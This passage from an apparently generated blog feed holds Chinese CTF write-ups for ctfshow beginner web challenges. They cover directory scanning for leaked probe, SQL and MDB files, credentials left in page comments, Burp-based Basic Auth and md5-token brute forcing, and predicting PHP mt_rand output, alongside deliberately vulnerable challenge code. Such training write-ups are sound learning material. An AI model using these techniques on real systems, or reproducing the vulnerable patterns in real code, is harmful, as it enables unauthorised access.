+&lt;li&gt;根据题目提示&lt;code&gt;对于测试用的探针，使用完毕后要及时删除，可能会造成信息泄露&lt;/code&gt;，访问靶场，查看源码结合Wappalyzer分析可知源码语言为PHP，那么此处使用的探针大概率为&lt;a href=&#34;D:%5Cmarkdown_note%5Cweb%E6%B8%97%E9%80%8F%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93%E6%89%8B%E5%86%8C%5C%E6%B5%8B%E8%AF%95%E6%8E%A2%E9%92%88%E6%B3%84%E9%9C%B2_php%E6%8E%A2%E9%92%88.md&#34;&gt;PHP探针&lt;/a&gt;&lt;img alt=&#34;截图&#34; loading=&#34;lazy&#34; src=&#34;https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/144717886122944282e592dbe144b529.png&#34;&gt;&lt;/li&gt;
+&lt;li&gt;使用御剑扫描靶场后台php文件，同目录下发现tz.php（探针），尝试打开&lt;img alt=&#34;截图&#34; loading=&#34;lazy&#34; src=&#34;https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/db14a94eabfdb373a1d376b481c01739.png&#34;&gt;&lt;/li&gt;
+&lt;li&gt;分析发现为雅黑探针页面，寻找phpinfo并访问&lt;img alt=&#34;截图&#34; loading=&#34;lazy&#34; src=&#34;https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/75d9c5f5b8adfb2194cee2a0369c22fb.png&#34;&gt;&lt;/li&gt;
+&lt;li&gt;查询获得flag&lt;img alt=&#34;截图&#34; loading=&#34;lazy&#34; src=&#34;https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/59ecf6e3d34f7ca63860ba2b60207121.png&#34;&gt;&lt;/li&gt;
+&lt;/ol&gt;</description>
+    </item>
+    <item>
+      <title>Web17</title>
+      <link>http://localhost:1313/posts/auran_lu/ctfshow/web%E5%85%A5%E9%97%A8/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/web17/</link>
+      <pubDate>Mon, 10 Mar 2025 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/posts/auran_lu/ctfshow/web%E5%85%A5%E9%97%A8/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/web17/</guid>
+      <description>&lt;p&gt;&lt;img alt=&#34;截图&#34; loading=&#34;lazy&#34; src=&#34;https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/5e0a6a6935f01eab2ebd6c5e0553f998.png&#34;&gt;&lt;/p&gt;
+&lt;br/&gt;
+&lt;ol&gt;
+&lt;li&gt;根据提示&lt;code&gt;备份的sql文件会泄露敏感信息&lt;/code&gt;，使用dirsearch扫描靶场目录，发现同目录下的&lt;a href=&#34;D:%5Cmarkdown_note%5Cweb%E6%B8%97%E9%80%8F%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93%E6%89%8B%E5%86%8C%5C%E5%B8%B8%E8%A7%81%E5%89%8D%E7%AB%AF%E8%AF%AD%E8%A8%80%E5%92%8C%E6%95%B0%E6%8D%AE%E5%BA%93%E6%90%AD%E9%85%8D.md&#34;&gt;backup.sql&lt;/a&gt;的数据库备份文件&lt;img alt=&#34;截图&#34; loading=&#34;lazy&#34; src=&#34;https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/fb693e255efa44fb595596fcda7476a4.png&#34;&gt;&lt;/li&gt;
+&lt;li&gt;访问backup.sql&lt;img alt=&#34;截图&#34; loading=&#34;lazy&#34; src=&#34;https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/1d93a4ea3480f1d111e860ae215879b5.png&#34;&gt;&lt;/li&gt;
+&lt;li&gt;查看backup.sql，发现flag&lt;img alt=&#34;截图&#34; loading=&#34;lazy&#34; src=&#34;https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/d7192b61c018357e84a63fbfdae284d7.png&#34;&gt;&lt;/li&gt;
+&lt;/ol&gt;</description>
+    </item>
+    <item>
+      <title>Web18</title>
+      <link>http://localhost:1313/posts/auran_lu/ctfshow/web%E5%85%A5%E9%97%A8/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/web18/</link>
+      <pubDate>Mon, 10 Mar 2025 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/posts/auran_lu/ctfshow/web%E5%85%A5%E9%97%A8/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/web18/</guid>
+      <description>&lt;p&gt;&lt;img alt=&#34;截图&#34; loading=&#34;lazy&#34; src=&#34;https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/9c5d371b7e4b851a1b3790f5e89a89f2.png&#34;&gt;&lt;/p&gt;
+&lt;br/&gt;
+&lt;ol&gt;
+&lt;li&gt;题目提示&lt;code&gt;不要着急，休息，休息一会儿，玩101分给你flag&lt;/code&gt;，访问靶场发现为flybird问题。根据提示，猜想需要抓包更改分数提交判断，尝试抓个任意分数的包&lt;img src=&#34;https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/47555e525473fe132451dfd5316097ea.png&#34; alt=&#34;截图&#34; style=&#34;zoom:50%;&#34; /&gt;&lt;/li&gt;
+&lt;li&gt;抓包后发现无可利用点&lt;img alt=&#34;截图&#34; loading=&#34;lazy&#34; src=&#34;https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/a11ea1b90d57f9409b32726d5eb6c8bc.png&#34;&gt;，尝试访问并下载Flappy_js.js源码进行代码审计。&lt;/li&gt;
+&lt;li&gt;代码审计寻找分数判断或游戏启停判断部分，审计源码发现得分大于101后的条件函数输出部分存在Unicode编码&lt;img alt=&#34;截图&#34; loading=&#34;lazy&#34; src=&#34;https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/f68cba986e02037d6cee331d10212a85.png&#34;&gt;&lt;/li&gt;
+&lt;li&gt;尝试解码得到提示&lt;code&gt;你赢了，去幺幺零点皮爱吃皮看看&lt;/code&gt;&lt;img alt=&#34;截图&#34; loading=&#34;lazy&#34; src=&#34;https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/c13ac8195a574d96d67fc610d61c8fad.png&#34;&gt;&lt;/li&gt;
+&lt;li&gt;访问110.php，获得flag&lt;img alt=&#34;image-20250310185940989&#34; loading=&#34;lazy&#34; src=&#34;https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/image-20250310185940989.png&#34;&gt;&lt;/li&gt;
+&lt;/ol&gt;</description>
+    </item>
+    <item>
+      <title>Web19</title>
+      <link>http://localhost:1313/posts/auran_lu/ctfshow/web%E5%85%A5%E9%97%A8/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/web19/</link>
+      <pubDate>Mon, 10 Mar 2025 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/posts/auran_lu/ctfshow/web%E5%85%A5%E9%97%A8/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/web19/</guid>
+      <description>&lt;p&gt;&lt;img alt=&#34;截图&#34; loading=&#34;lazy&#34; src=&#34;https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/8f06a5e4e7b82262a8cc872b6cba6ed7.png&#34;&gt;&lt;/p&gt;
+&lt;br/&gt;
+&lt;ol&gt;
+&lt;li&gt;&lt;code&gt;题目提示：密钥什么的，就不要放在前端了&lt;/code&gt;，根据提示首先查看网页源码，在注释中发现用户名及秘钥&lt;img alt=&#34;截图&#34; loading=&#34;lazy&#34; src=&#34;https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/d71b601229b3fa18e4897187b8d7b861.png&#34;&gt;&lt;/li&gt;
+&lt;li&gt;根据源码，使用POST方式提交username及pazzword，获得flag&lt;img alt=&#34;截图&#34; loading=&#34;lazy&#34; src=&#34;https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/bdc979cc21b1589429e808d720ce74fe.png&#34;&gt;&lt;/li&gt;
+&lt;/ol&gt;</description>
+    </item>
+    <item>
+      <title>Web20</title>
+      <link>http://localhost:1313/posts/auran_lu/ctfshow/web%E5%85%A5%E9%97%A8/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/web20/</link>
+      <pubDate>Mon, 10 Mar 2025 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/posts/auran_lu/ctfshow/web%E5%85%A5%E9%97%A8/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/web20/</guid>
+      <description>&lt;p&gt;&lt;img alt=&#34;截图&#34; loading=&#34;lazy&#34; src=&#34;https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/d5e63d870567365a23b321c9eb5be2b8.png&#34;&gt;&lt;/p&gt;
+&lt;br/&gt;
+&lt;ol&gt;
+&lt;li&gt;访问靶场获得提示，&lt;a href=&#34;D:%5Cmarkdown_note%5Cweb%E6%B8%97%E9%80%8F%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93%E6%89%8B%E5%86%8C%5C%E5%B8%B8%E8%A7%81%E5%89%8D%E7%AB%AF%E8%AF%AD%E8%A8%80%E5%92%8C%E6%95%B0%E6%8D%AE%E5%BA%93%E6%90%AD%E9%85%8D.md&#34;&gt;数据库和前端语言的搭配&lt;/a&gt;&lt;img alt=&#34;截图&#34; loading=&#34;lazy&#34; src=&#34;https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/199825175f8869fcbdd00bccacb6be42.png&#34;&gt;&lt;/li&gt;
+&lt;li&gt;根据题目提示&lt;code&gt;mdb文件是早期asp+access构架的数据库文件，文件泄露相当于数据库被脱裤了。&lt;/code&gt;尝试使用dirsearch扫描靶场目录发现数据库文件&lt;img alt=&#34;截图&#34; loading=&#34;lazy&#34; src=&#34;https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/d78aaf8694d8be1cf09f5d2729a645b3.png&#34;&gt;&lt;/li&gt;
+&lt;li&gt;尝试访问db/db.mdb下载后使用ACESS打开，浏览数据表，发现flag&lt;img alt=&#34;截图&#34; loading=&#34;lazy&#34; src=&#34;https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/55444fba33edcfa74b0484fcab3e3d0f.png&#34;&gt;&lt;/li&gt;
+&lt;/ol&gt;</description>
+    </item>
+    <item>
+      <title>Web21</title>
+      <link>http://localhost:1313/posts/auran_lu/ctfshow/web%E5%85%A5%E9%97%A8/%E7%88%86%E7%A0%B4/web21/</link>
+      <pubDate>Mon, 10 Mar 2025 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/posts/auran_lu/ctfshow/web%E5%85%A5%E9%97%A8/%E7%88%86%E7%A0%B4/web21/</guid>
+      <description>&lt;p&gt;&lt;img alt=&#34;截图&#34; loading=&#34;lazy&#34; src=&#34;https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/5c4eac463952b9a1028ee22a87876d19.png&#34;&gt;&lt;/p&gt;
+&lt;br/&gt;
+&lt;ol&gt;
+&lt;li&gt;链接靶场后提示需要登录密码&lt;img alt=&#34;image-20250310182454902&#34; loading=&#34;lazy&#34; src=&#34;https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/image-20250310182454902.png&#34;&gt;输入密码登录尝试抓包&lt;/li&gt;
+&lt;li&gt;观察请求包发现，用户名与密码被base64编码后放入Authorization字段&lt;img alt=&#34;截图&#34; loading=&#34;lazy&#34; src=&#34;https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/f71e2fa2b1a1998cd6fc9563c8295285.png&#34;&gt;解码后观察组合格式&lt;img alt=&#34;截图&#34; loading=&#34;lazy&#34; src=&#34;https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/4d741f978adbda2d73faeb2e32faac4f.png&#34;&gt;&lt;/li&gt;
+&lt;li&gt;下载题目所给字典dic.zip，打开后发现仅有密码字。猜想用户名不变为admin，故仅添加八位后部分为payload&lt;img alt=&#34;截图&#34; loading=&#34;lazy&#34; src=&#34;https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/dc9eb966d691264bc65a8edccd6b6433.png&#34;&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;&lt;img alt=&#34;截图&#34; loading=&#34;lazy&#34; src=&#34;https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/81a07a4f733c828fd843749c67c563ad.png&#34;&gt;导入字典，选择base64编码，取消url编码&lt;img alt=&#34;截图&#34; loading=&#34;lazy&#34; src=&#34;https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/c798ce1289bf2046a5a9d9ce63641b3a.png&#34;&gt;&lt;/p&gt;
+&lt;ol start=&#34;4&#34;&gt;
+&lt;li&gt;爆破成功&lt;img alt=&#34;截图&#34; loading=&#34;lazy&#34; src=&#34;https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/a0825568b7c207f98e3edce244be85f0.png&#34;&gt;&lt;/li&gt;
+&lt;li&gt;修改后发包，获得flag&lt;img alt=&#34;截图&#34; loading=&#34;lazy&#34; src=&#34;https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/bdd45e74e361c3bb0c69fc250c2dd677.png&#34;&gt;&lt;/li&gt;
+&lt;/ol&gt;</description>
+    </item>
+    <item>
+      <title>Web22</title>
+      <link>http://localhost:1313/posts/auran_lu/ctfshow/web%E5%85%A5%E9%97%A8/%E7%88%86%E7%A0%B4/web22/</link>
+      <pubDate>Mon, 10 Mar 2025 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/posts/auran_lu/ctfshow/web%E5%85%A5%E9%97%A8/%E7%88%86%E7%A0%B4/web22/</guid>
+      <description>&lt;p&gt;&lt;img alt=&#34;截图&#34; loading=&#34;lazy&#34; src=&#34;https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/79776d6fbaadd62ef9a7546499ee251f.png&#34;&gt;&lt;/p&gt;</description>
+    </item>
+    <item>
+      <title>Web23</title>
+      <link>http://localhost:1313/posts/auran_lu/ctfshow/web%E5%85%A5%E9%97%A8/%E7%88%86%E7%A0%B4/web23/</link>
+      <pubDate>Mon, 10 Mar 2025 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/posts/auran_lu/ctfshow/web%E5%85%A5%E9%97%A8/%E7%88%86%E7%A0%B4/web23/</guid>
+      <description>&lt;p&gt;&lt;img alt=&#34;image-20250310182750499&#34; loading=&#34;lazy&#34; src=&#34;https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/image-20250310182750499.png&#34;&gt;&lt;/p&gt;
+&lt;br/&gt;
+&lt;h3 id=&#34;0x01&#34;&gt;0x01&lt;/h3&gt;
+&lt;p&gt;链接靶场，回显php源码&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-php+HTML&#34; data-lang=&#34;php+HTML&#34;&gt;&amp;lt;?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-09-03 11:43:51
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-03 11:56:11
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+
+*/
+error_reporting(0);
+
+include(&amp;#39;flag.php&amp;#39;);
+if(isset($_GET[&amp;#39;token&amp;#39;])){
+    $token = md5($_GET[&amp;#39;token&amp;#39;]);
+    if(substr($token, 1,1)===substr($token, 14,1) &amp;amp;&amp;amp; substr($token, 14,1) ===substr($token, 17,1)){
+        if((intval(substr($token, 1,1))+intval(substr($token, 14,1))+substr($token, 17,1))/substr($token, 1,1)===intval(substr($token, 31,1))){
+            echo $flag;
+        }
+    }
+}else{
+    highlight_file(__FILE__);
+
+}
+?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;0x02&#34;&gt;0x02&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;代码审计，代码大意为将get传参的token值进行md5加密，进行判断。若下标1的数+下标14+下标17/下标1===，则输出flag&lt;/li&gt;
+&lt;li&gt;尝试任意传参后使用burp抓包后，将传参值添加为payload后进行爆破&lt;img alt=&#34;image-20250227160029770&#34; loading=&#34;lazy&#34; src=&#34;https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/image-20250227160029770.png&#34;&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;0x03&#34;&gt;0x03&lt;/h3&gt;
+&lt;p&gt;过滤响应包长度，查看另类响应包回显内容，获得flag&lt;img alt=&#34;image-20250227160155230&#34; loading=&#34;lazy&#34; src=&#34;https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/image-20250227160155230.png&#34;&gt;&lt;/p&gt;</description>
+    </item>
+    <item>
+      <title>Web25</title>
+      <link>http://localhost:1313/posts/auran_lu/ctfshow/web%E5%85%A5%E9%97%A8/%E7%88%86%E7%A0%B4/web25/</link>
+      <pubDate>Mon, 10 Mar 2025 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/posts/auran_lu/ctfshow/web%E5%85%A5%E9%97%A8/%E7%88%86%E7%A0%B4/web25/</guid>
+      <description>&lt;p&gt;&lt;img alt=&#34;image-20250228120023126&#34; loading=&#34;lazy&#34; src=&#34;https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/image-20250228120023126.png&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;0x01&#34;&gt;0x01&lt;/h3&gt;
+&lt;p&gt;访问靶场，获得源码回显&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-php+HTML&#34; data-lang=&#34;php+HTML&#34;&gt;&amp;lt;?php
+ 
+error_reporting(0);
+include(&amp;#34;flag.php&amp;#34;);
+if(isset($_GET[&amp;#39;r&amp;#39;])){
+    $r = $_GET[&amp;#39;r&amp;#39;];
+    mt_srand(hexdec(substr(md5($flag), 0,8)));
+    #md5($flag)：md5() 函数是一个哈希函数，它将传入的参数进行哈希处理并返回一个32位的十六进制字符串。在这里，$flag 是一个变量，它可能代表一个标志或者一个关键值
+    #substr(md5($flag), 0, 8)：substr() 函数用于截取字符串的一部分。在这里，它将对上一步得到的32位的十六进制字符串进行截取，只保留前8位。
+    #hexdec(substr(md5($flag), 0, 8))：hexdec() 函数将十六进制字符串转换为对应的十进制数值。在这里，它将对前一步得到的8位十六进制字符串进行转换
+    #mt_srand(hexdec(substr(md5($flag), 0, 8)));：mt_srand() 函数用于设置 Mersenne Twister 随机数生成器的种子。在这里，它将使用前面得到的十进制数值作为种子，来初始化随机数生成器。
+    #这段代码的目的是将一个标志或者关键值 $flag 经过一系列的处理，得到一个种子值，并将该种子值用于初始化随机数生成器。这样做的目的可能是为了生成一个可预测但不易破解的随机数序列。
+    
+    $rand = intval($r)-intval(mt_rand());
+    if((!$rand)){        #如果$rand的值为0就执行下面的代码，否则执行所对应else部分代码
+        if($_COOKIE[&amp;#39;token&amp;#39;]==(mt_rand()+mt_rand())){
+        #$_COOKIE[&amp;#39;token&amp;#39;]：$_COOKIE 是一个包含通过 HTTP cookie 传递给当前脚本的变量的数组。$_COOKIE[&amp;#39;token&amp;#39;] 表示从 cookie 中获取名为 &amp;#34;token&amp;#34; 的值。
+        #mt_rand()：mt_rand() 函数是一个 Mersenne Twister 随机数生成器，用于生成一个随机整数
+        #根据这段代码的逻辑，它可能用于验证 &amp;#34;token&amp;#34; 的值是否等于两个随机整数之和。如果相等，那么说明该 &amp;#34;token&amp;#34; 值是通过生成随机数得到的，可以被认为是合法的。否则，如果不相等，那么可能是伪造的或者被篡改的 &amp;#34;token&amp;#34; 值。
+            echo $flag;
+        }
+    }else{
+        echo $rand;
+    }
+}else{
+    highlight_file(__FILE__);
+    echo system(&amp;#39;cat /proc/version&amp;#39;);
+}
+Linux version 5.4.0-148-generic (buildd@lcy02-amd64-112) (gcc version 9.4.0 (Ubuntu 9.4.0-1ubuntu1~20.04.1)) #165-Ubuntu SMP Tue Apr 18 08:53:12 UTC 2023 Linux version 5.4.0-148-generic (buildd@lcy02-amd64-112) (gcc version 9.4.0 (Ubuntu 9.4.0-1ubuntu1~20.04.1)) #165-Ubuntu SMP Tue Apr 18 08:53:12 UTC 2023
+&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;0x02&#34;&gt;0x02&lt;/h3&gt;
+&lt;p&gt;代码审计后传入参数r=0以获得mt_rand第一次输出的值&lt;img alt=&#34;image-20250301180104600&#34; loading=&#34;lazy&#34; src=&#34;https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/image-20250301180104600.png&#34;&gt;&lt;/p&gt;</description>
+    </item>
+    <item>
+      <title>Web26</title>
+      <link>http://localhost:1313/posts/auran_lu/ctfshow/web%E5%85%A5%E9%97%A8/%E7%88%86%E7%A0%B4/web26/</link>
+      <pubDate>Mon, 10 Mar 2025 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/posts/auran_lu/ctfshow/web%E5%85%A5%E9%97%A8/%E7%88%86%E7%A0%B4/web26/</guid>
+      <description>&lt;p&gt;&lt;img alt=&#34;image-20250303092111449&#34; loading=&#34;lazy&#34; src=&#34;https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/image-20250303092111449.png&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;0x01&#34;&gt;0x01&lt;/h3&gt;
+&lt;p&gt;访问靶场&lt;/p&gt;
+&lt;p&gt;&lt;img alt=&#34;image-20250310183428404&#34; loading=&#34;lazy&#34; src=&#34;https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/image-20250310183428404.png&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;0x02&#34;&gt;0x02&lt;/h3&gt;
+&lt;p&gt;未发现利用点，尝试访问href链接&lt;/p&gt;
+&lt;p&gt;&lt;img alt=&#34;image-20250303092340439&#34; loading=&#34;lazy&#34; src=&#34;https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/image-20250303092340439.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;无输入尝试提交&lt;/p&gt;
+&lt;p&gt;&lt;img alt=&#34;image-20250303092421291&#34; loading=&#34;lazy&#34; src=&#34;https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/image-20250303092421291.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;任意输入后提交并尝试抓包&lt;img alt=&#34;image-20250303092451098&#34; loading=&#34;lazy&#34; src=&#34;https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/image-20250303092451098.png&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;0x03&#34;&gt;0x03&lt;/h3&gt;
+&lt;p&gt;发现传参利用点&lt;/p&gt;
+&lt;p&gt;&lt;img alt=&#34;image-20250303092530208&#34; loading=&#34;lazy&#34; src=&#34;https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/image-20250303092530208.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;尝试爆破&lt;/p&gt;
+&lt;p&gt;&lt;img alt=&#34;image-20250303092603696&#34; loading=&#34;lazy&#34; src=&#34;https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/image-20250303092603696.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;获得flag&lt;/p&gt;
+&lt;p&gt;&lt;img alt=&#34;image-20250303093713031&#34; loading=&#34;lazy&#34; src=&#34;https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/image-20250303093713031.png&#34;&gt;&lt;/p&gt;</description>
+    </item>
+    <item>
+      <title>Web27</title>
+      <link>http://localhost:1313/posts/auran_lu/ctfshow/web%E5%85%A5%E9%97%A8/%E7%88%86%E7%A0%B4/web27/</link>
+      <pubDate>Mon, 10 Mar 2025 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/posts/auran_lu/ctfshow/web%E5%85%A5%E9%97%A8/%E7%88%86%E7%A0%B4/web27/</guid>
+      <description>&lt;p&gt;&lt;img alt=&#34;image-20250303094718114&#34; loading=&#34;lazy&#34; src=&#34;https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/image-20250303094718114.png&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;0x01&#34;&gt;0x01&lt;/h3&gt;
+&lt;p&gt;&lt;strong&gt;访问靶场&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img alt=&#34;image-20250303095058966&#34; loading=&#34;lazy&#34; src=&#34;https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/image-20250303095058966.png&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;0x02信息收集&#34;&gt;0x02信息收集&lt;/h3&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-php+HTML&#34; data-lang=&#34;php+HTML&#34;&gt;&amp;lt;!DOCTYPE html PUBLIC &amp;#34;-//W3C//DTD XHTML 1.0 Transitional//EN&amp;#34; &amp;#34;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&amp;#34;&amp;gt;
+&amp;lt;HTML&amp;gt;
+	&amp;lt;HEAD&amp;gt;
+		&amp;lt;title&amp;gt;欢迎使用正方教务管理系统！请登录&amp;lt;/title&amp;gt;
+		&amp;lt;meta content=&amp;#34;IE=7&amp;#34; http-equiv=&amp;#34;X-UA-Compatible&amp;#34;&amp;gt;
+		&amp;lt;meta content=&amp;#34;text/html; charset=gb2312&amp;#34; http-equiv=&amp;#34;Content-Type&amp;#34;&amp;gt;
+		&amp;lt;meta content=&amp;#34;gb2312&amp;#34; http-equiv=&amp;#34;Content-Language&amp;#34;&amp;gt;
+		&amp;lt;meta name=&amp;#34;robots&amp;#34; content=&amp;#34;all&amp;#34;&amp;gt;
+		&amp;lt;meta name=&amp;#34;author&amp;#34; content=&amp;#34;作者信息&amp;#34;&amp;gt;
+		&amp;lt;meta name=&amp;#34;Copyright&amp;#34; content=&amp;#34;版权信息&amp;#34;&amp;gt;
+		&amp;lt;meta name=&amp;#34;description&amp;#34; content=&amp;#34;站点介绍&amp;#34;&amp;gt;
+		&amp;lt;meta name=&amp;#34;keywords&amp;#34; content=&amp;#34;站点关键词&amp;#34;&amp;gt;
+		&amp;lt;LINK rel=&amp;#34;icon&amp;#34; type=&amp;#34;image/x-icon&amp;#34; href=&amp;#34;style/base/favicon.ico&amp;#34;&amp;gt;
+			&amp;lt;LINK rel=&amp;#34;shortcut icon&amp;#34; type=&amp;#34;image/x-icon&amp;#34; href=&amp;#34;style/base/favicon.ico&amp;#34;&amp;gt;
+				&amp;lt;LINK rel=&amp;#34;stylesheet&amp;#34; type=&amp;#34;text/css&amp;#34; href=&amp;#34;style/base/jw.css&amp;#34; media=&amp;#34;all&amp;#34;&amp;gt;
+					&amp;lt;LINK rel=&amp;#34;stylesheet&amp;#34; type=&amp;#34;text/css&amp;#34; href=&amp;#34;style/standard/jw.css&amp;#34; media=&amp;#34;all&amp;#34;&amp;gt; &amp;lt;!--[if IE 6]&amp;gt;
+			&amp;lt;SCRIPT src=&amp;#34;style/js/ie6comm.js&amp;#34;&amp;gt;&amp;lt;/SCRIPT&amp;gt;
+			&amp;lt;SCRIPT&amp;gt; 
+				DD_belatedPNG.fix(&amp;#39;img&amp;#39;); 
+			&amp;lt;/SCRIPT&amp;gt;
+		&amp;lt;![endif]--&amp;gt;
+						
+						&amp;lt;style&amp;gt;.fangshua {
+	COLOR: red; FONT-SIZE: 14px; FONT-WEIGHT: bold
+}
+.login_right DL {
+	MARGIN: 0px 0px 0px 105px; MIN-HEIGHT: 20px; WIDTH: 285px; _height: 20px
+}
+&amp;lt;/style&amp;gt;
+	&amp;lt;/HEAD&amp;gt;
+	&amp;lt;body class=&amp;#34;login_bg&amp;#34;&amp;gt;
+		&amp;lt;form name=&amp;#34;form1&amp;#34; onsubmit=&amp;#34;return false;&amp;#34; id=&amp;#34;form1&amp;#34;&amp;gt;
+			&amp;lt;div class=&amp;#34;login_main&amp;#34;&amp;gt;
+				&amp;lt;div class=&amp;#34;login_logo&amp;#34;&amp;gt;
+					&amp;lt;h2&amp;gt;&amp;lt;IMG src=&amp;#34;logo/logo_school.png&amp;#34;&amp;gt;&amp;lt;/h2&amp;gt;
+					&amp;lt;h3&amp;gt;&amp;lt;IMG src=&amp;#34;logo/logo_jw.png&amp;#34;&amp;gt;&amp;lt;/h3&amp;gt;
+				&amp;lt;/div&amp;gt;
+				&amp;lt;div class=&amp;#34;login_left&amp;#34;&amp;gt;&amp;lt;IMG class=&amp;#34;login_pic&amp;#34; src=&amp;#34;logo/login_pic.png&amp;#34;&amp;gt;&amp;lt;/div&amp;gt;
+				&amp;lt;div class=&amp;#34;login_right&amp;#34;&amp;gt;
+					&amp;lt;dl style=&amp;#34;MARGIN-TOP: 92px&amp;#34;&amp;gt;
+						&amp;lt;dt class=&amp;#34;uesr&amp;#34;&amp;gt;
+							&amp;lt;label id=&amp;#34;lbYhm&amp;#34;&amp;gt;学号：&amp;lt;/label&amp;gt;
+						&amp;lt;/dt&amp;gt;
+						&amp;lt;dd&amp;gt;
+							&amp;lt;input id=&amp;#34;a&amp;#34; name=&amp;#34;username&amp;#34; type=&amp;#34;text&amp;#34; id=&amp;#34;txtUserName&amp;#34; tabindex=&amp;#34;1&amp;#34; class=&amp;#34;text_nor&amp;#34; autocomplete=&amp;#34;off&amp;#34; /&amp;gt;&amp;lt;/dd&amp;gt;&amp;lt;/dl&amp;gt;
+					&amp;lt;div style=&amp;#34;CLEAR: both&amp;#34;&amp;gt;&amp;lt;/div&amp;gt;
+					&amp;lt;dl&amp;gt;
+						&amp;lt;dt class=&amp;#34;passw&amp;#34;&amp;gt;
+							&amp;lt;label id=&amp;#34;lbMm&amp;#34;&amp;gt;密码：&amp;lt;/label&amp;gt;
+						&amp;lt;/dt&amp;gt;
+						&amp;lt;dd&amp;gt;
